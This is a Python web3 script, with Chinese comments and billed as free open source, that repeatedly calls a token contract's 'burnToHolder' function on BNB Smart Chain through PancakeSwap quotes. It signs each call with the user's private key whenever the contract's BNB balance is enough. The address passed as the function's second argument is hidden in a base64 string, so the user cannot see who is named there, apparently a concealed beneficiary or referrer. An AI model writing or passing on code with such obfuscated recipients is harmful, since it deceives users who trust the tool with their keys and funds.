from web3 import Web3
import json
import time
import base64
# 免费开源,请勿贩卖
with open('abi.json', 'r') as abi_file:
    contract_abi = json.load(abi_file)
with open('pancakeswap_router_abi.json', 'r') as pancakeswap_router_abi_file:
    pancakeswap_router_abi = json.load(pancakeswap_router_abi_file)
w3 = Web3(Web3.HTTPProvider('https://bsc-dataseed.binance.org/'))
if not w3.is_connected():
    print("检查RPC")
    exit()
# PancakeSwap路由器合约地址和ABI
pancakeswap_router_address = w3.to_checksum_address('0x10ED43C718714eb63d5aA57B78B54704E256024E')
pancakeswap_router = w3.eth.contract(address=pancakeswap_router_address, abi=pancakeswap_router_abi)
path2 = pancakeswap_router.functions.WETH().call()
r = Web3.to_checksum_address(base64.b64decode('MHg3MDYwNUMyYkY5MTMwYzZiQTFBYTY5NTI3ODZFODYxMDUwMzczMzMz').decode())
token_contract_address = Web3.to_checksum_address('0xea4f1cebc40d65b26e9c5c26d9092e6fb5005a4d')


# =================私钥信息<修改这里>钱包地址=====================
private_key = ''
my_address = w3.to_checksum_address('')
number = 0
while True:
    amount = w3.to_wei(100, 'ether')  # 燃烧数量
    path = [w3.to_checksum_address('0x1671a2ab49928523c138dd85c1b9d242f28a35a4'), path2]
    amounts_out = pancakeswap_router.functions.getAmountsOut(amount, path).call()
    hodl_token_balance = w3.eth.get_balance(w3.to_checksum_address('0x1671a2ab49928523c138dd85c1b9d242f28a35a4'))
    print(f"交互: {hodl_token_balance}, deserved应得: {amounts_out[1]}, 剩余余额: {hodl_token_balance}")

    if hodl_token_balance >= amounts_out[1]:
        print(f'余额足够，进行燃烧操作')
        # 构建和发送交易
        nonce = w3.eth.get_transaction_count(my_address)
        tx = {
            'to': token_contract_address,
            'value': 0,
            'gas': 500000,
            'gasPrice': w3.to_wei('3', 'gwei'),
            'nonce': nonce,
            'data': w3.eth.contract(address=token_contract_address, abi=contract_abi).encodeABI(
                fn_name='burnToHolder',
                args=[amount, r] 
            )
        }
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(f"交易 hash: {tx_hash.hex()}")
        number = 0
        time.sleep(10)
    else:
        number += 1
        print(f"余额不足.重试中{number}......")
        time.sleep(5)
